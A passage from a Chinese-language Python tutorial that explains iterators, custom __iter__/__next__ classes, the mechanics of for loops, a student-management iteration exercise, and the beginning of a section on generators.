class="built_in">next</span>(nums_iter)</span><br><span class="line"><span class="built_in">print</span>(num2)</span><br><span class="line"></span><br><span class="line">num3 = <span class="built_in">next</span>(nums_iter)</span><br><span class="line"><span class="built_in">print</span>(num3)</span><br><span class="line"></span><br><span class="line">num4 = <span class="built_in">next</span>(nums_iter)</span><br><span class="line"><span class="built_in">print</span>(num4)</span><br><span class="line"></span><br><span class="line">num5 = <span class="built_in">next</span>(nums_iter)  <span class="comment"># 这里会产生异常</span></span><br><span class="line"><span class="built_in">print</span>(num5)</span><br></pre></td></tr></table></figure><p>可以看到23行，即第5次调用<code>next()</code>时，产生了异常。why？？？？？？</p><p>因为列表<code>nums</code>中只有4个数据，也就是说可以调用4次<code>next</code>是完全合理的，但是如果，调用的次数多了肯定是不合理，都没有5个数据，怎么可以能取5次呢！显然是不对的</p><p>此时估计想明白了，为什么会产生异常，其实就是一种告知迭代结束的标志而已</p><p>添加<code>try...except...</code>即可解决刚刚遇到的问题</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    num5 = <span class="built_in">next</span>(nums_iter)</span><br><span class="line">    <span class="built_in">print</span>(num5)</span><br><span class="line"><span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;迭代结束: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="自定义迭代器"><a href="#自定义迭代器" class="headerlink" title="自定义迭代器"></a>自定义迭代器</h5><p>大家是否还记得 在刚开学习今天的知识时，我们引入了一个学生管理系统的问题，该怎样实现呢</p><p>我们下面来谈谈</p><ul><li><code>__iter__</code>方法</li><li><code>__next__</code>方法</li></ul><blockquote><p><code>__iter__</code>方法</p></blockquote><p>上面提到<code>iter()</code>方法必须是对”可迭代“对象 才能 提取到 ”迭代器“对象，但是怎样保证自定义的对象是”可迭代“对象呢？</p><p>答：只要在类中定义<code>__iter__</code>方法，那么这个类创建出来的对象一定是可迭代对象</p><p>通俗的说：一个具备了<code>__iter__</code>方法的对象就是一个可以迭代的对象</p><p>测试代码一：无<code>__iter__</code>方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyList</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.container = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, item</span>):</span><br><span class="line">        self.container.append(item)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">mylist = MyList()</span><br><span class="line">mylist.add(<span class="number">11</span>)</span><br><span class="line">mylist.add(<span class="number">22</span>)</span><br><span class="line">mylist.add(<span class="number">33</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mylist是否是可以迭代对象&quot;</span>, <span class="built_in">isinstance</span>(mylist, Iterable))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> mylist:</span><br><span class="line">    <span class="built_in">print</span>(temp)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">mylist是否是可以迭代对象 False</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/ubuntu/Desktop/stu_code/测试代码.py&quot;, line 19, in &lt;module&gt;</span><br><span class="line">    for temp in mylist:</span><br><span class="line">TypeError: &#x27;MyList&#x27; object is not iterable</span><br></pre></td></tr></table></figure><p>测试代码二：有<code>__iter__</code>方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyList</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.container = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, item</span>):</span><br><span class="line">        self.container.append(item)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">mylist = MyList()</span><br><span class="line">mylist.add(<span class="number">11</span>)</span><br><span class="line">mylist.add(<span class="number">22</span>)</span><br><span class="line">mylist.add(<span class="number">33</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mylist是否是可以迭代对象&quot;</span>, <span class="built_in">isinstance</span>(mylist, Iterable))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> mylist:</span><br><span class="line">    <span class="built_in">print</span>(temp)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">mylist是否是可以迭代对象 True</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/ubuntu/Desktop/stu_code/测试代码.py&quot;, line 21, in &lt;module&gt;</span><br><span class="line">    for temp in mylist:</span><br><span class="line">TypeError: iter() returned non-iterator of type &#x27;NoneType&#x27;</span><br></pre></td></tr></table></figure><p>能够看出，一个类，只要有<code>__iter__</code>方法，那么这个类创建出来的对象就是可以迭代对象</p><p>其实，当我们调用<code>iter()</code>函数提取一个可迭代对象的 迭代器时，实际上会自动调用这个对象的<code>__iter__</code>方法，并且这个方法返回迭代器</p><blockquote><p><code>__next__</code>方法</p></blockquote><p>通过上面的分析，我们已经知道，迭代器是用来帮助我们记录每次迭代访问到的位置，当我们对迭代器使用<code>next()</code>函数的时候，迭代器会向我们返回它所记录位置的下一个位置的数据。</p><p>实际上，在使用<code>next()</code>函数的时候，调用的就是迭代器对象的<code>__next__</code>方法（Python3中是对象的<code>__next__</code>方法，Python2中是对象的<code>next()</code>方法）。</p><p>所以，我们要想构造一个迭代器，就要实现它的<code>__next__</code>方法。</p><p>但这还不够，python要求迭代器本身也是可迭代的，所以我们还要为迭代器实现<code>__iter__</code>方法，而<code>__iter__</code>方法要返回一个迭代器，迭代器自身正是一个迭代器，所以迭代器的<code>__iter__</code>方法返回自身即可。</p><p>一个实现了<code>__iter__</code>方法和<code>__next__</code>方法的对象，就是迭代器</p><p>如何判断一个对象是否是迭代器</p><p>可以使用 isinstance() 判断一个对象是否是 Iterator 对象：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">56</span>]: <span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterator</span><br><span class="line"></span><br><span class="line">In [<span class="number">57</span>]: <span class="built_in">isinstance</span>([], Iterator)</span><br><span class="line">Out[<span class="number">57</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">58</span>]: <span class="built_in">isinstance</span>(<span class="built_in">iter</span>([]), Iterator)</span><br><span class="line">Out[<span class="number">58</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">59</span>]: <span class="built_in">isinstance</span>(<span class="built_in">iter</span>(<span class="string">&quot;abc&quot;</span>), Iterator)</span><br><span class="line">Out[<span class="number">59</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>自定义迭代器：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyList</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;自定义的一个可迭代对象&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.items = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, val</span>):</span><br><span class="line">        self.items.append(val)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> MyIterator()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyIterator</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;自定义的供上面可迭代对象使用的一个迭代器&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mylist = MyList()</span><br><span class="line">mylist_iter = <span class="built_in">iter</span>(mylist)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mylist是否是可以迭代对象&quot;</span>, <span class="built_in">isinstance</span>(mylist, Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mylist是否是迭代器&quot;</span>, <span class="built_in">isinstance</span>(mylist, Iterator))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mylist_iter是否是可以迭代对象&quot;</span>, <span class="built_in">isinstance</span>(mylist_iter, Iterable))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mylist_iter是否是迭代器&quot;</span>, <span class="built_in">isinstance</span>(mylist_iter, Iterator))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">mylist是否是可以迭代对象 True</span><br><span class="line">mylist是否是迭代器 False</span><br><span class="line">mylist_iter是否是可以迭代对象 True</span><br><span class="line">mylist_iter是否是迭代器 True</span><br></pre></td></tr></table></figure><blockquote><p>自定义<code>迭代器</code>案例</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyList</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;自定义的一个可迭代对象&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.items = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, val</span>):</span><br><span class="line">        self.items.append(val)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        myiterator = MyIterator(self)</span><br><span class="line">        <span class="keyword">return</span> myiterator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyIterator</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;自定义的供上面可迭代对象使用的一个迭代器&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, mylist</span>):</span><br><span class="line">        self.mylist = mylist</span><br><span class="line">        <span class="comment"># current用来记录当前访问到的位置</span></span><br><span class="line">        self.current = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current &lt; <span class="built_in">len</span>(self.mylist.items):</span><br><span class="line">            item = self.mylist.items[self.current]</span><br><span class="line">            self.current += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> item</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mylist = MyList()</span><br><span class="line">    mylist.add(<span class="number">1</span>)</span><br><span class="line">    mylist.add(<span class="number">2</span>)</span><br><span class="line">    mylist.add(<span class="number">3</span>)</span><br><span class="line">    mylist.add(<span class="number">4</span>)</span><br><span class="line">    mylist.add(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> mylist:</span><br><span class="line">        <span class="built_in">print</span>(num)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><p>可迭代对象通过<code>__iter__</code>方法向我们返回一个迭代器，我们在迭代一个可迭代对象的时候，实际上就是先获取该对象提供的一个迭代器，然后通过这个迭代器来依次获取对象中的每一个数据。</p><h5 id="for-in-循环的本质"><a href="#for-in-循环的本质" class="headerlink" title="for...in...循环的本质"></a><code>for...in...</code>循环的本质</h5><ol><li>先调用<code>iter()</code>函数，它会自动调用可迭代对象中的<code>__iter__</code>方法，此方法返回这个可迭代对象的 迭代器对象</li><li>对获取到的迭代器不断调用<code>next()</code>函数，它会自动调用迭代器中的<code>__next__</code>方法来获取下一个值</li><li>当遇到<code>StopIteration</code>异常后循环结束</li></ol><h5 id="并不是只有for循环能接收可迭代对象"><a href="#并不是只有for循环能接收可迭代对象" class="headerlink" title="并不是只有for循环能接收可迭代对象"></a>并不是只有<code>for</code>循环能接收可迭代对象</h5><p>除了for循环能接收可迭代对象，list、tuple等也能接收。</p><p>测试代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyList</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;自定义的一个可迭代对象&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.items = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, val</span>):</span><br><span class="line">        self.items.append(val)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        myiterator = MyIterator(self)</span><br><span class="line">        <span class="keyword">return</span> myiterator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyIterator</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;自定义的供上面可迭代对象使用的一个迭代器&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, mylist</span>):</span><br><span class="line">        self.mylist = mylist</span><br><span class="line">        <span class="comment"># current用来记录当前访问到的位置</span></span><br><span class="line">        self.current = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current &lt; <span class="built_in">len</span>(self.mylist.items):</span><br><span class="line">            item = self.mylist.items[self.current]</span><br><span class="line">            self.current += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> item</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mylist = MyList()</span><br><span class="line">    mylist.add(<span class="number">1</span>)</span><br><span class="line">    mylist.add(<span class="number">2</span>)</span><br><span class="line">    mylist.add(<span class="number">3</span>)</span><br><span class="line">    mylist.add(<span class="number">4</span>)</span><br><span class="line">    mylist.add(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    nums = <span class="built_in">list</span>(mylist)</span><br><span class="line">    <span class="built_in">print</span>(nums)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[1, 2, 3, 4, 5]</span><br></pre></td></tr></table></figure><h5 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h5><ul><li>凡是可作用于<code>for </code>循环的对象都是<code> Iterable</code> 类型</li><li>凡是可作用于 <code>next()</code> 函数的对象都是<code> Iterator</code> 类型</li><li>序列数据类型如<code> list</code> 、<code>dict</code>、<code>str</code>等是 <code>Iterable </code>但不是<code>Iterator</code>，不过可以通过 <code>iter() </code>函数获得一个 <code>Iterator </code>对象</li></ul><h5 id="随堂作业"><a href="#随堂作业" class="headerlink" title="随堂作业"></a>随堂作业</h5><p>既然已经学习过了迭代器，那么今天刚开始的知识点也就自然有了答案</p><ul><li>实现用<code>for</code>循环遍历学生系统中的所有学生信息</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StuSystem</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    学生管理系统</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.stus = []</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        添加一个新的学生</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        name = <span class="built_in">input</span>(<span class="string">&quot;请输入新学生的姓名:&quot;</span>)</span><br><span class="line">        tel = <span class="built_in">input</span>(<span class="string">&quot;请输入新学生的手机号:&quot;</span>)</span><br><span class="line">        address = <span class="built_in">input</span>(<span class="string">&quot;请输入新学生的住址:&quot;</span>)</span><br><span class="line">        new_stu = <span class="built_in">dict</span>()</span><br><span class="line">        new_stu[<span class="string">&quot;name&quot;</span>] = name</span><br><span class="line">        new_stu[<span class="string">&quot;tel&quot;</span>] = tel</span><br><span class="line">        new_stu[<span class="string">&quot;address&quot;</span>] = address</span><br><span class="line">        self.stus.append(new_stu)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; <span class="built_in">len</span>(self.stus):</span><br><span class="line">            ret = self.stus[self.current_num]</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.current_num = <span class="number">0</span></span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建管理系统对象</span></span><br><span class="line">stu_sys = StuSystem()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加3个学生信息到系统中</span></span><br><span class="line">stu_sys.add()</span><br><span class="line">stu_sys.add()</span><br><span class="line">stu_sys.add()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 问题1：怎样才能实现用for循环遍历系统中所有的学生信息呢？下面的方式能实现吗？</span></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> stu_sys:</span><br><span class="line">    <span class="built_in">print</span>(temp)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">(base) ubuntu@VM-16-5-ubuntu:~/Desktop/stu_code$ /home/ubuntu/miniconda3/bin/python /home/ubuntu/Desktop/stu_code/测试代码.py</span><br><span class="line">请输入新学生的姓名:顾安</span><br><span class="line">请输入新学生的手机号:13711111111</span><br><span class="line">请输入新学生的住址:长沙</span><br><span class="line">请输入新学生的姓名:安娜</span><br><span class="line">请输入新学生的手机号:13711111112</span><br><span class="line">请输入新学生的住址:长沙</span><br><span class="line">请输入新学生的姓名:双双</span><br><span class="line">请输入新学生的手机号:13711111113</span><br><span class="line">请输入新学生的住址:长沙</span><br><span class="line">&#123;&#x27;name&#x27;: &#x27;顾安&#x27;, &#x27;tel&#x27;: &#x27;13711111111&#x27;, &#x27;address&#x27;: &#x27;长沙&#x27;&#125;</span><br><span class="line">&#123;&#x27;name&#x27;: &#x27;安娜&#x27;, &#x27;tel&#x27;: &#x27;13711111112&#x27;, &#x27;address&#x27;: &#x27;长沙&#x27;&#125;</span><br><span class="line">&#123;&#x27;name&#x27;: &#x27;双双&#x27;, &#x27;tel&#x27;: &#x27;13711111113&#x27;, &#x27;address&#x27;: &#x27;长沙&#x27;&#125;</span><br></pre></td></tr></table></figure><ul><li>对输入的数据进行格式转换</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StuSystem</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    学生管理系统</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.stus = []</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        添加一个新的学生</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        name = <span class="built_in">input</span>(<span class="string">&quot;请输入新学生的姓名:&quot;</span>)</span><br><span class="line">        tel = <span class="built_in">input</span>(<span class="string">&quot;请输入新学生的手机号:&quot;</span>)</span><br><span class="line">        address = <span class="built_in">input</span>(<span class="string">&quot;请输入新学生的住址:&quot;</span>)</span><br><span class="line">        new_stu = <span class="built_in">dict</span>()</span><br><span class="line">        new_stu[<span class="string">&quot;name&quot;</span>] = name</span><br><span class="line">        new_stu[<span class="string">&quot;tel&quot;</span>] = tel</span><br><span class="line">        new_stu[<span class="string">&quot;address&quot;</span>] = address</span><br><span class="line">        self.stus.append(new_stu)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; <span class="built_in">len</span>(self.stus):</span><br><span class="line">            ret = self.stus[self.current_num]</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.current_num = <span class="number">0</span></span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stu_sys = StuSystem()</span><br><span class="line"></span><br><span class="line">stu_sys.add()</span><br><span class="line">stu_sys.add()</span><br><span class="line">stu_sys.add()</span><br><span class="line"></span><br><span class="line">stu_list = [x <span class="keyword">for</span> x <span class="keyword">in</span> stu_sys]</span><br><span class="line"><span class="built_in">print</span>(stu_list)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">请输入新学生的姓名:顾安</span><br><span class="line">请输入新学生的手机号:13711111111</span><br><span class="line">请输入新学生的住址:长沙</span><br><span class="line">请输入新学生的姓名:安娜</span><br><span class="line">请输入新学生的手机号:13711111112</span><br><span class="line">请输入新学生的住址:南京</span><br><span class="line">请输入新学生的姓名:双双</span><br><span class="line">请输入新学生的手机号:13711111113</span><br><span class="line">请输入新学生的住址:上海</span><br><span class="line">[&#123;&#x27;name&#x27;: &#x27;顾安&#x27;, &#x27;tel&#x27;: &#x27;13711111111&#x27;, &#x27;address&#x27;: &#x27;长沙&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;安娜&#x27;, &#x27;tel&#x27;: &#x27;13711111112&#x27;, &#x27;address&#x27;: &#x27;南京&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;双双&#x27;, &#x27;tel&#x27;: &#x27;13711111113&#x27;, &#x27;address&#x27;: &#x27;上海&#x27;&#125;]</span><br></pre></td></tr></table></figure><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><h5 id="引入-1"><a href="#引入-1" class="headerlink" title="引入"></a>引入</h5><p>在Python中，使用生成器可以很方便的支持迭代器协议。生成器通过生成器函数产生，生成器函数可以通过常规的def语句来定义，但是不用return返回，而是用yield一次返回一个结果，在每个结果之间挂起和继续它们的状态，来自动实现迭代协议。</p><p>也就是说，yield是一个语法糖，内部实现支持了迭代器协议，同时yield内部是一个状态机，维护着挂起和继续的状态。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_range</span>(<span class="params">n</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        <span class="keyword">yield</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">my_range = my_range(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(my_range)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(my_range))</span><br><span class="line"><span class="comment"># print([i for i in my_range])</span></span><br></pre></td></tr></table></figure><p>在这个例子中，定义了一个生成器函数，函数返回一个生成器对象，然后就可以通过for语句进行迭代访问了。</p><p>其实，生成器函数返回生成器的迭代器。 “生成器的迭代器”这个术语通常被称作”生成器”。要注意的是生成器就是一类特殊的迭代器。作为一个迭代器，生成器必须要定义一些方法，其中一个就是__next__()。如同迭代器一样，我们可以使用__next__()函数来获取下一个值。</p><h5 id="生成器工作流程"><a href="#生成器工作流程" class="headerlink" title="生成器工作流程"></a>生成器工作流程</h5><p>下面就仔细看看生成器是怎么工作的。从上面的例子也可以看到，生成器函数跟普通的函数是有很大差别的。结合上面的例子我们加入一些打印信息，进一步看看生成器的执行流程：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_range</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始迭代...&#x27;</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;迭代中...&#x27;</span>)</span><br><span class="line">        <span class="keyword">yield</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;迭代结束...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_range = my_range(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># print(my_range)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(my_range))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(my_range))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(my_range))</span><br></pre></td></tr></table></figure><p>通过结果可以看到：</p><ol><li><p>当调用生成器函数的时候，函数只是返回了一个生成器对象，并没有执行。</p></li><li><p>当next()方法第一次被调用的时候，生成器函数才开始执行，执行到yield语句处停止: <code>next()</code>方法的返回值就是yield语句处的参数（yielded value）</p></li><li><p>当继续调用next()方法的时候，函数将接着上一次停止的yield语句处继续执行，并到下一个yield处停止；如果后面没有yield就抛出StopIteration异常</p></li></ol><h5 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h5><p>在开始介绍生成器表达式之前，先看看我们比较熟悉的列表解析( List comprehensions)，列表解析一般都是下面的形式。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[expr <span class="keyword">for</span> iter_var <span class="keyword">in</span> iterable <span class="keyword">if</span> cond_expr]</span><br></pre></td></tr></table></figure><p>迭代iterable里所有内容，每一次迭代后，把iterable里满足cond_expr条件的内容放到iter_var中，再在表达式expr中应该iter_var的内容，最后用表达式的计算值生成一个列表。</p><p>例如，生成一个<code>list</code>包含50以内的所有奇数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>) <span class="keyword">if</span> i % <span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>生成器表达式是在python2.4中引入的，当序列过长， 